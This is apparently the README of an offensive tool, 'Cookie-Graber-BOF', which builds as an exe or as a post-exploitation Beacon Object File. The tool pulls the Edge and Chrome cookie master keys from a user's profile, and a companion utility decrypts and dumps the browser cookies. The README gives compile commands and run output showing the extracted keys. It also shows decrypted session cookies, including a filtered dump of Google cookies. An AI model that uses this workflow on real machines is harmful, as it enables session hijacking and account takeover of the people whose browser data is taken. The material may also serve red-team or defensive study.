# Cookie-Graber-BOF
C or BOF file to extract WebKit master key to decrypt user cookie

# Compiling

If compiled as an exe `gcc cookie-graber.c -o cookie-graber_x64.exe -lshlwapi -lcrypt32`
If compiled as a bof `gcc cookie-graber.c -c -o cookie-graber_x64_bof.o -DCOMPILE_BOF`

# Extracting the master key

```
C:\> cookie-graber_x64.exe
Extracting Edge Key
---------------------------------------------
Fetching browser master key using the following path: C:\Users\me\AppData\Local\Microsoft\Edge\User Data\Local State
C:\Users\me\AppData\Local\Microsoft\Edge\User Data\Local State size is 70381 bytes
Allocating 368 bytes for the base64 key
Base64 key is: RFBBUEkBAAAA0Iyd3wEV0RGMegDAT8KX6wEAAABFNvO6coavRYQkOV1UUW2gEAAAAAoAAABFAGQAZwBlAAAAEGYAAAABAAAgAAAApq+CWXDOeQpheLzNhI6jOwv/QnvPEjvDGiLvLCd+NgYAAAAADoAAAAACAAAgAAAAEjU+7oooFgL9V1JmXutyukLlFByVAHnBv5cvAK8ZpZswAAAAM6framGIS4Rg36AAB5Mb+AttzablKCfEsyBG1lZUstE+zjQ15uBZyB+VHv+A7fkIQAAAALhrepFv9N75lWFCxlALUxp1ozYU8OOAOnWLAt03wzl8KkDdL9BhM3veu1mUd/uJwLspK0hQuZt535y0+4ZStGA=
Base64 decoded key need 275 bytes
Master key is: \x64\x24\x72\xac\x12\x28\x2c\xad\x63\x23\x1d\x65\xf5\x42\xdb\xfb\xad\x66\x81\xfb\xa0\x27\xe3\x71\xeb\xb3\xff\xcb\x2c\x54\xfc\xc1

Extracting Chrome Key
---------------------------------------------
Fetching browser master key using the following path: C:\Users\me\AppData\Local\Google\Chrome\User Data\Local State
C:\Users\me\AppData\Local\Google\Chrome\User Data\Local State size is 129940 bytes
Allocating 356 bytes for the base64 key
Base64 key is: RFBBUEkBAAAA0Iyd3wEV0RGMegDAT8KX6wEAAADEQHXytpJjRI8UCvIL946JAAAAAAIAAAAAABBmAAAAAQAAIAAAABQxgQWAHtcZhsNDufCFvJ4L8WI3404RueLElj3ke6EIAAAAAA6AAAAAAgAAIAAAAEk/RPYsHX/rMYi2u9TlQ5B5r8Fj4ZvXV5JkRqMEsFmZMAAAAKnJkfsfG1NwUoIH+mB1C41naRlyfIMp9XB4SWaFMpsYr4+svzQu/kdN3/7rwzs6bkAAAAA+jfpIKLjs1D32EeiApdVtHULizYEvWuWYdPfvPKUHujoOhAAJ4hUo5/zf4HEu47BoSDpjBX4LCfuy5hwSvJOa
Base64 decoded key need 267 bytes
Master key is: \x5f\x20\xfe\x18\x77\x2e\x05\xd2\xea\x7c\xc6\xa0\x2c\x42\x32\x94\x82\xc9\x56\xd7\x33\x2f\xed\xe7\x43\xcf\x4c\x7d\x17\x3d\x4f\xb8

Completed
```


# Recovering the cookies

Once you have the master key, base64 encode it and pass it to the CookieProcessor.exe utility. 

```
CookieProcessor.exe pathtocookiedb base64key (optional)hostkeyfilter
```

```
C:\>CookieProcessor.exe "C:\Users\me\AppData\Local\Google\Chrome\User Data\Default\Network\Cookies" XyD+GHcuBdLqfMagLEIylILJVtczL+3nQ89MfRc9T7g=
www.cvedetails.com:__utma=1.1380952103.1637251852.1637251852.1637251852.1;
www.cvedetails.com:__utmz=1.1637251852.1.1.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided);
www.cvedetails.com:__utmt=1;
www.cvedetails.com:__utmb=1.1.10.1637251852;
.stackoverflow.com:prov=7afdff85-9a19-9ce1-d1a8-881f267af86c;
.stackoverflow.com:_ga=GA1.2.48033691.1637251893;
.stackoverflow.com:_gid=GA1.2.1056400725.1637251893;
.stackoverflow.com:_gat=1;
.github.com:_octo=GH1.1.879120819.1637252873;
.github.com:logged_in=no;
docs.microsoft.com:original_req_url=https://docs.microsoft.com/en-us/support/breadcrumb/toc.json;
.microsoft.com:MSCC=NR;
...
```

With the filter set to google
```
C:\>>CookieProcessor.exe "C:\Users\me\AppData\Local\Google\Chrome\User Data\Default\Network\Cookies" XyD+GHcuBdLqfMagLEIylILJVtczL+3nQ89MfRc9T7g= google
.google.ca:AEC=HQJk6xSaFLaTQwOXXC5eIeQ;
.google.ca:NID=511=Jg3odiWJ7XRaL-ozGATG9rji646GGIGiBPbf64dQPq7KBqDhv4;
.google.ca:1P_JAR=2023-02-15-18;
...
```
